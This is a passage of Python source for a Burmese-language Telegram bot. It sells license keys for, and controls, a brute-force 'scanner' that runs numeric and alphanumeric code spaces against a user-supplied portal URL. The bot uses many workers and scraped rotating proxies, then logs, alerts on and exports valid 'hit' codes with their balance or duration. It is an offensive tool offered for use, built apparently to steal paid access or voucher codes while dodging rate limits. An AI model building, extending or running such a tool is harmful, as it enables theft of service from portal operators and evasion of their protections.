        if update.effective_user.id not in ADMIN_IDS:
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


# ─────────────────────────── COMMANDS ───────────────────────────

@admin_only
async def admin_cmd(update, context):
    log_user(update, "ADMIN")
    await update.message.reply_text(
        "🛠 **Admin Panel**", reply_markup=get_admin_markup(),
        parse_mode=ParseMode.MARKDOWN)


async def whoami(update, context):
    log_user(update, "WHOAMI")
    u = update.effective_user
    info = (
        f"🆔 ID: `{u.id}`\n"
        f"👤 Name: {u.first_name or '-'} {u.last_name or ''}\n"
        f"📛 Username: @{u.username or 'မရှိ'}\n"
        f"🌐 Language: {u.language_code or '-'}\n"
        f"🤖 Bot: {u.is_bot}\n"
        f"⭐ Premium: {getattr(u, 'is_premium', False)}\n"
        f"🔑 Admin: {u.id in ADMIN_IDS}\n"
        f"✅ Authorized: {is_authorized(u.id)}"
    )
    await update.message.reply_text(info, parse_mode=ParseMode.MARKDOWN)


async def hits_cmd(update, context):
    log_user(update, "HITS")
    user_id = update.effective_user.id

    target_key = None
    if context.args:
        target_key = context.args[0].strip().upper()

    if target_key:
        if user_id not in ADMIN_IDS:
            _, own_key = get_user_hits(user_id)
            if own_key != target_key:
                await update.message.reply_text("❌ ကိုယ့် key ပဲ ကြည့်လို့ရတယ်။")
                return
        data = _load_licenses()
        if target_key not in data:
            await update.message.reply_text(f"❌ Key `{target_key}` မရှိဘူး။",
                                            parse_mode=ParseMode.MARKDOWN)
            return
        hits = data[target_key].get("hits", [])
        owner = data[target_key].get("redeemed_by")
        owner_uname = data[target_key].get("redeemed_by_username")
        header_extra = f"👤 Owner: `{owner}`"
        if owner_uname:
            header_extra += f" @{owner_uname}"
        header_extra += "\n"
    else:
        if not is_authorized(user_id):
            await update.message.reply_text("🔒 License လိုအပ်တယ်။",
                                            reply_markup=get_activation_markup())
            return
        hits, target_key = get_user_hits(user_id)
        if target_key is None:
            await update.message.reply_text("📋 သင့် key မရှိဘူး။")
            return
        header_extra = ""

    if not hits:
        await update.message.reply_text(
            f"📋 Key `{target_key}` မှာ hit မရှိသေးဘူး။",
            parse_mode=ParseMode.MARKDOWN)
        return

    target = get_user_data(user_id).get("target_duration")

    lines = []
    for h in hits[-30:]:
        ts = time.strftime("%m-%d %H:%M", time.localtime(h.get("at", 0)))
        bal = h.get("balance") or "..."
        mark = "🎯 " if (target and target.lower() in (bal or "").lower()) else ""
        lines.append(f"{mark}`{h['code']}` — {bal} — {ts}")

    total = len(hits)
    text = (f"📋 **Hit Codes ({total} ခု)**\n"
            f"🔑 Key: `{target_key}`\n"
            f"{header_extra}\n" + "\n".join(lines))
    if total > 30:
        text += f"\n\n_... နောက်ထပ် {total - 30} ခု (file ထဲ)_"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


@admin_only
async def allhits_cmd(update, context):
    log_user(update, "ALLHITS")
    rows = total_hits_all()
    if not rows:
        await update.message.reply_text("📋 Hit မရှိဘူး။")
        return
    lines = []
    grand = 0
    for key, uid, uname, name, n in rows:
        who = f"`{uid}`"
        if uname:
            who += f" @{uname}"
        if name:
            who += f" ({name})"
        lines.append(f"`{key}` — **{n}** ခု — by {who}")
        grand += n
    await update.message.reply_text(
        f"📊 **All Hits — {grand} ခု**\n\n" + "\n".join(lines),
        parse_mode=ParseMode.MARKDOWN)


async def clearhits_cmd(update, context):
    log_user(update, "CLEAR")
    user_id = update.effective_user.id
    data = _load_licenses()
    for key, entry in data.items():
        if entry.get("redeemed_by") == user_id and not entry.get("revoked"):
            n = len(entry.get("hits", []))
            entry["hits"] = []
            _save_licenses(data)
            await update.message.reply_text(
                f"🗑 Key `{key}` ရဲ့ hit {n} ခု ဖျက်ပြီး။",
                parse_mode=ParseMode.MARKDOWN)
            return
    await update.message.reply_text("📋 Key မရှိဘူး။")


@admin_only
async def export_cmd(update, context):
    log_user(update, "EXPORT")
    if not context.args:
        await update.message.reply_text(
            "📤 **သုံးပုံ**\n\n`/export MG-XXXX-XXXX-XXXX`",
            parse_mode=ParseMode.MARKDOWN)
        return

    key = context.args[0].strip().upper()
    ok, fname, count, owner = export_key_hits(key)

    if not ok:
        await update.message.reply_text(f"❌ Key `{key}` မရှိဘူး။",
                                        parse_mode=ParseMode.MARKDOWN)
        return

    if count == 0:
        await update.message.reply_text(f"📋 Key `{key}` မှာ hit မရှိဘူး။",
                                        parse_mode=ParseMode.MARKDOWN)
        return

    with open(fname, "rb") as f:
        await update.message.reply_document(
            document=f,
            filename=fname,
            caption=(f"📤 **{fname}**\n"
                     f"🔑 Key: `{key}`\n"
                     f"👤 Owner: `{owner}`\n"
                     f"🔥 Hits: **{count}**"),
            parse_mode=ParseMode.MARKDOWN)


async def start(update, context):
    log_user(update, "START")
    user_id = update.effective_user.id
    ud = get_user_data(user_id)

    if not is_authorized(user_id):
        await update.message.reply_text(
            "🔒 **License လိုအပ်တယ်**\n\n"
            "Bot ကို သုံးဖို့ Key လိုတယ်။\n"
            "Key ရှိရင် အောက်က ခလုတ်နှိပ်ပြီး ထည့်ပါ။",
            reply_markup=get_activation_markup(),
            parse_mode=ParseMode.MARKDOWN)
        return

    await update.message.reply_text(main_panel(ud, user_id),
                                    reply_markup=get_main_menu_markup(ud),
                                    parse_mode=ParseMode.MARKDOWN)


# ─────────────────────────── CALLBACKS ───────────────────────────

async def handle_callbacks(update, context):
    global is_fetching_proxies
    log_user(update, "CB")
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_activate":
        ud["state"] = "waiting_for_key"
        await query.message.reply_text("🔑 **Key ကို ရိုက်ထည့်ပါ**\n\nFormat: `MG-XXXX-XXXX-XXXX`",
                                       parse_mode=ParseMode.MARKDOWN)
        return

    if user_id in ADMIN_IDS:
        if data == "adm_gen":
            await query.message.reply_text("🔑 **Duration ရွေး**",
                                           reply_markup=get_gen_dur_markup())
            return
        elif data.startswith("adm_gen_"):
            label = data[len("adm_gen_"):]
            if label in DURATIONS:
                key = create_key(label, user_id)
                await query.message.reply_text(
                    f"✅ **Key ဆောက်ပြီး**\n\n`{key}`\n\n⏱ {DURATION_LABELS[label]}",
                    parse_mode=ParseMode.MARKDOWN)
            return
        elif data == "adm_list":
            await query.message.reply_text(list_keys(), parse_mode=ParseMode.MARKDOWN)
            return
        elif data == "adm_revoke":
            ud["state"] = "waiting_for_revoke"
            await query.message.reply_text("🚫 Key ကို ရိုက်ပါ")
            return
        elif data == "adm_del":
            ud["state"] = "waiting_for_delkey"
            await query.message.reply_text(
                "🗑 **Key ဖျက်ရန်**\n\n"
                "Key ကို ရိုက်ထည့်ပါ (ဥပမာ `MG-ABCD-EFGH-IJKL`)\n"
                "⚠️ ဒါက permanent — ပြန်ယူလို့ မရဘူး။")
            return
        elif data == "adm_back":
            await query.message.reply_text("🛠 **Admin Panel**",
                                           reply_markup=get_admin_markup(),
                                           parse_mode=ParseMode.MARKDOWN)
            return

    if not is_authorized(user_id):
        await query.message.reply_text(
            "🔒 License သက်တမ်း ကုန်သွားပြီ။ Key အသစ် ထည့်ပါ။",
            reply_markup=get_activation_markup())
        return

    pm = get_proxy_manager()

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text("🌐 **Portal URL ကိုဖြည့်ပါ**")
        return
    elif data == "btn_mode_menu":
        keyboard = [
            [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
             InlineKeyboardButton("Number 7", callback_data="set_mode_num7"),
             InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
             InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton("Abc 6", callback_data="set_mode_abc6"),
             InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton("Mix 7", callback_data="set_mode_mix7"),
             InlineKeyboardButton("Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton("Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
        ]
        await query.message.reply_text("⚙️ **Choose Scanner Mode**",
                                       reply_markup=InlineKeyboardMarkup(keyboard))
        return
    elif data == "btn_set_workers":
        ud["state"] = "waiting_for_workers"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text(
            f"⚙️ **Worker အရေအတွက် ထည့်ပါ**\n\n"
            f"လက်ရှိ: `{ud.get('worker_count', DEFAULT_WORKERS)}`\n"
            f"Range: `1 – {MAX_WORKERS}`")
        return
    elif data == "btn_target_dur":
        await query.message.reply_text(
            f"🎯 **Target Duration ရွေး**\n\n"
            f"လက်ရှိ: `{ud.get('target_duration') or 'any'}`\n\n"
            f"ရွေးထားတဲ့ duration ကျရင် alert ပို့မယ်၊ "
            f"dashboard မှာ target match ပဲ ပြ။",
            reply_markup=get_target_markup())
        return
    elif data.startswith("set_target_"):
        target = data[len("set_target_"):]
        ud["target_duration"] = None if target == "any" else target
        ud["state"] = None
        await query.message.reply_text(
            f"✅ Target = `{target}`\n\n" + main_panel(ud, user_id),
            reply_markup=get_main_menu_markup(ud),
            parse_mode=ParseMode.MARKDOWN)
        return
    elif data == "btn_add_proxies":
        ud["state"] = "waiting_for_proxy_text"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text(
            "📥 **Proxy စာရင်း ထည့်ပါ**\nတစ်ကြောင်းချင်း")
        return
    elif data == "btn_fetch_proxies":
        if is_fetching_proxies:
            await query.message.reply_text("⚠️ Fetch လုပ်နေဆဲ။ ခဏစောင့်ပါ။")
            return
        is_fetching_proxies = True
        try:
            msg = await query.message.reply_text("🔄 ProxyScrape ကနေ ဆွဲနေတယ်...")
            added, total, err = await fetch_proxies_from_url(replace=False)
            if err:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=msg.message_id,
                    text=f"❌ Fetch error: {err}")
                return
            pm.reload()
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=msg.message_id,
                text=(f"✅ **Fetch ပြီး**\n\n"
                      f"🆕 အသစ်: **{added}**\n"
                      f"📊 စုစုပေါင်း: **{total}**\n\n"
                      f"🧪 `Test Proxies` နှိပ်ပြီး filter လုပ်ပါ။"),
                parse_mode=ParseMode.MARKDOWN)
        finally:
            is_fetching_proxies = False
        return
    elif data == "btn_test_proxies":
        await query.message.reply_text("🧪 Testing proxies... ခဏစောင့်ပါ။")
        asyncio.create_task(test_all_proxies(user_id, context))
        return
    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.reply_text("❌ Portal URL မထည့်ရသေးပါ။")
            return
        ud["state"] = None
        msg = await query.message.reply_text("🔄 Initializing scanner dashboard...")
        ud["dash_msg_id"] = msg.message_id
        ud["stop_event"].clear()
        ud["stats"] = {"tried": 0, "hits": 0, "expired": 0, "limits": 0,
                       "target_hits": 0, "start_time": time.time()}
        ud["valid_codes"] = []
        ud["tried_codes"] = set()
        ud["target_alert"] = None
        ud["last_alert_at"] = 0
        task = asyncio.ensure_future(run_user_scanner(context, user_id))
        ud["task"] = task
        return
    elif data == "btn_back_main":
        await query.message.reply_text(main_panel(ud, user_id),
                                       reply_markup=get_main_menu_markup(ud),
                                       parse_mode=ParseMode.MARKDOWN)
        return
    elif data == "stop_scan":
        ud["stop_event"].set()
        return
    elif data.startswith("set_mode_"):
        mode = data[len("set_mode_"):]
        mode_configs = {
            "num6": ("num6", "012345678", 6),
            "num7": ("num7", "012345678", 7),
            "num8": ("num8", "012345678", 8),
            "num9": ("num9", "012345678", 9),
            "abc6": ("abc6", "abcdefghijkmnpqrstuvwxyz", 6),
            "mix6": ("mix6", "2345678abcdefghijkmnpqrstuvwxyz", 6),
            "mix7": ("mix7", "2345678abcdefghijkmnpqrstuvwxyz", 7),
            "mix8": ("mix8", "2345678abcdefghijkmnpqrstuvwxyz", 8),
            "mix9": ("mix9", "2345678abcdefghijkmnpqrstuvwxyz", 9),
        }
        if mode == "custom":
            ud["mode"] = "custom"
            ud["state"] = "waiting_for_digit"
            ud["menu_msg_id"] = query.message.message_id
            await query.message.reply_text("🔢 **Start Digit**\nနံပါတ်တစ်လုံး ထည့်ပါ")
            return
        if mode in mode_configs:
            ud["mode"], ud["char_set"], ud["code_len"] = mode_configs[mode]
            ud["state"] = None
            await query.message.reply_text(main_panel(ud, user_id),
                                           reply_markup=get_main_menu_markup(ud),
                                           parse_mode=ParseMode.MARKDOWN)
        return


# ─────────────────────────── TEXT ───────────────────────────

async def handle_text(update, context):
    log_user(update, "MSG")
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    text = update.message.text.strip()

    if ud["state"] == "waiting_for_key":
        u = update.effective_user
        ok, msg, exp = redeem_key(text, user_id,
                                  username=u.username,
                                  first_name=u.first_name)
        ud["state"] = None
        if ok:
            await update.message.reply_text(
                f"{msg}\n\n" + main_panel(ud, user_id),
                reply_markup=get_main_menu_markup(ud),
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(msg, reply_markup=get_activation_markup())
        return

    if user_id in ADMIN_IDS and ud["state"] == "waiting_for_revoke":
        ud["state"] = None
        ok, msg = revoke_key(text)
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        return

    if user_id in ADMIN_IDS and ud["state"] == "waiting_for_delkey":
        ud["state"] = None
        ok, msg = delete_key(text)
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        return

    if not is_authorized(user_id):
        await update.message.reply_text(
            "🔒 License လိုအပ်တယ်။ Key ထည့်ပါ။",
            reply_markup=get_activation_markup())
        return

    if ud["state"] == "waiting_for_portal_url":
        if text.startswith("http://") or text.startswith("https://"):
            ud["portal_url"] = text
            p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
            with open(p_file, "w") as f:
                f.write(text)
            ud["state"] = None
            await update.message.reply_text(
                "✅ Portal URL သိမ်းပြီးပါပြီ\n\n" + main_panel(ud, user_id),
                reply_markup=get_main_menu_markup(ud),
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid URL!")
        return
    elif ud["state"] == "waiting_for_workers":
        if text.isdigit():
            n = int(text)
            if 1 <= n <= MAX_WORKERS:
                ud["worker_count"] = n
                ud["state"] = None
                await update.message.reply_text(
                    f"✅ Workers = `{n}`\n\n" + main_panel(ud, user_id),
                    reply_markup=get_main_menu_markup(ud),
                    parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text(f"❌ 1 – {MAX_WORKERS} အတွင်း")
        else:
            await update.message.reply_text("❌ နံပါတ်ပဲ ထည့်ပါ")
        return
    elif ud["state"] == "waiting_for_proxy_text":
        lines = [l.strip() for l in text.split("\n") if l.strip()]
        with open(PROXY_FILE, "a") as f:
            for line in lines:
                f.write(line + "\n")
        pm.reload()
        ud["state"] = None
        await update.message.reply_text(
            "✅ Proxies သိမ်းပြီးပါပြီ\n\n" + main_panel(ud, user_id),
            reply_markup=get_main_menu_markup(ud),
            parse_mode=ParseMode.MARKDOWN)
        return
    elif ud["state"] == "waiting_for_digit":
        digit = text.strip()
        if digit.isdigit() and len(digit) == 1:
            ud["start_digit"] = digit
            ud["state"] = None
            await update.message.reply_text(
                f"✅ Custom Start Digit = `{digit}`\n\n" + main_panel(ud, user_id),
                reply_markup=get_main_menu_markup(ud),
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Single digit only!")
        return


# ─────────────────────────── MAIN ───────────────────────────

def get_bot_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            if token:
                return token
    token = input("Bot Token: ").strip()
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
    return token


def main():
    bot_token = get_bot_token()
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("whoami", whoami))
    app.add_handler(CommandHandler("hits", hits_cmd))
    app.add_handler(CommandHandler("allhits", allhits_cmd))
    app.add_handler(CommandHandler("clearhits", clearhits_cmd))
    app.add_handler(CommandHandler("export", export_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Bot is running (proxy + license + hits + target filter + fetch)...")
    app.run_polling()


if __name__ == "__main__":
    main()